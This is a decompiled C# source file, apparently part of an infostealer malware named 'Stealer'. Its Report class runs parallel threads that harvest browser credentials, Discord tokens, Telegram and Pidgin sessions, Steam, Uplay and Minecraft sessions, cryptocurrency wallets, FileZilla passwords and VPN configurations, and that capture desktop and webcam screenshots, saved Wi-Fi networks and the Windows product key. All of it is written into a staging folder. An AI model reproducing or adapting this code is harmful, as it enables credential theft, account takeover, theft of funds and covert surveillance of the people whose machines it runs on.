using System;
using System.Collections.Generic;
using System.IO;
using System.Threading;
using Stealer.Chromium;
using Stealer.Edge;
using Stealer.Firefox;
using Stealer.InternetExplorer;

namespace Stealer
{
	// Token: 0x0200000D RID: 13
	internal sealed class Report
	{
		// Token: 0x06000047 RID: 71 RVA: 0x00002B8C File Offset: 0x00000D8C
		public static bool CreateReport(string sSavePath)
		{
			List<Thread> list = new List<Thread>();
			bool result;
			try
			{
				list.Add(new Thread(delegate()
				{
					FileGrabber.Run(sSavePath + "\\Grabber");
				}));
				list.Add(new Thread(delegate()
				{
					Stealer.Chromium.Recovery.Run(sSavePath + "\\Browsers");
					Stealer.Edge.Recovery.Run(sSavePath + "\\Browsers");
				}));
				list.Add(new Thread(delegate()
				{
					Stealer.Firefox.Recovery.Run(sSavePath + "\\Browsers");
				}));
				list.Add(new Thread(delegate()
				{
					try
					{
						Stealer.InternetExplorer.Recovery.Run(sSavePath + "\\Browsers");
					}
					catch
					{
					}
				}));
				list.Add(new Thread(delegate()
				{
					Discord.WriteDiscord(Discord.GetTokens(), sSavePath + "\\Messenger\\Discord");
				}));
				list.Add(new Thread(delegate()
				{
					Pidgin.GetAccounts(sSavePath + "\\Messenger\\Pidgin");
				}));
				list.Add(new Thread(delegate()
				{
					Telegram.GetTelegramSessions(sSavePath + "\\Messenger\\Telegram");
				}));
				list.Add(new Thread(delegate()
				{
					Steam.GetSteamSession(sSavePath + "\\Gaming\\Steam");
					Uplay.GetUplaySession(sSavePath + "\\Gaming\\Uplay");
				}));
				list.Add(new Thread(delegate()
				{
					Minecraft.SaveAll(sSavePath + "\\Gaming\\Minecraft");
				}));
				list.Add(new Thread(delegate()
				{
					Wallets.GetWallets(sSavePath + "\\Wallets");
				}));
				list.Add(new Thread(delegate()
				{
					FileZilla.WritePasswords(FileZilla.Steal(), sSavePath + "\\FileZilla");
				}));
				list.Add(new Thread(delegate()
				{
					ProtonVPN.Save(sSavePath + "\\VPN\\ProtonVPN");
					OpenVPN.Save(sSavePath + "\\VPN\\OpenVPN");
					NordVPN.Save(sSavePath + "\\VPN\\NordVPN");
				}));
				list.Add(new Thread(delegate()
				{
					Directory.CreateDirectory(sSavePath + "\\Directories");
					DirectoryTree.SaveDirectories(sSavePath + "\\Directories");
				}));
				Directory.CreateDirectory(sSavePath + "\\System");
				list.Add(new Thread(delegate()
				{
					ProcessList.WriteProcesses(sSavePath + "\\System");
					ActiveWindows.WriteWindows(sSavePath + "\\System");
				}));
				Thread thread = new Thread(delegate()
				{
					DesktopScreenshot.Make(sSavePath + "\\System");
					WebcamScreenshot.Make(sSavePath + "\\System");
				});
				thread.SetApartmentState(ApartmentState.STA);
				list.Add(thread);
				list.Add(new Thread(delegate()
				{
					Wifi.SavedNetworks(sSavePath + "\\System");
					Wifi.ScanningNetworks(sSavePath + "\\System");
				}));
				list.Add(new Thread(delegate()
				{
					File.WriteAllText(sSavePath + "\\System\\ProductKey.txt", ProductKey.GetWindowsProductKeyFromRegistry());
				}));
				foreach (Thread thread2 in list)
				{
					thread2.Start();
				}
				foreach (Thread thread3 in list)
				{
					thread3.Join();
				}
				result = true;
			}
			catch (Exception value)
			{
				Console.WriteLine(value);
				result = false;
			}
			return result;
		}
	}
}
